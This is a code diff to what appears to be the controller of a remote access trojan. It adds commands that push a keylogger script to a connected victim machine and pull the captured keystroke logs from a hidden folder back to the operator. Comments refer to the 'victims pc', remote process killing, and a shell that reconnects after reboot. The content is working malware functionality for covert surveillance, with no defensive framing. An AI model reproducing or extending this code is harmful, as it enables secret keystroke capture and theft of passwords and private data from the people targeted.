@@ -21,7 +21,7 @@ session_ids = []
 
 # saves all the command
 COMMANDS = ["help", "sessions"]
-SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill"]
+SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs"]
 
 
 class Commands:
@@ -187,6 +187,24 @@ class Commands:
                     print("you need to enter a pid(number)")
                     return
                 sendMessage(f"c x taskkill /im {args}")
+            elif not args:
+                print("You need arguments, type 'help' for more")
+            else:
+                print("Those are too many arguments only one is allowed")
+        elif message == "keylogger":
+            with open("extraScripts/keylogger.py", "r") as file:
+                sendMessage(file.read())
+            if receiveMessage() == "err":
+                print("You need to install the shell")
+                return
+        elif message == "getlogs":
+            exists = sendMessage("r o C:/$SysStartup/temp/logs.txt")
+            if exists != "err":
+                with open("downloadedLogs.txt", "a") as file:
+                    file.write(str(exists))
+            else:
+                print("Either wait for a logfile or install the keylogger.")
+                return
 
         # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
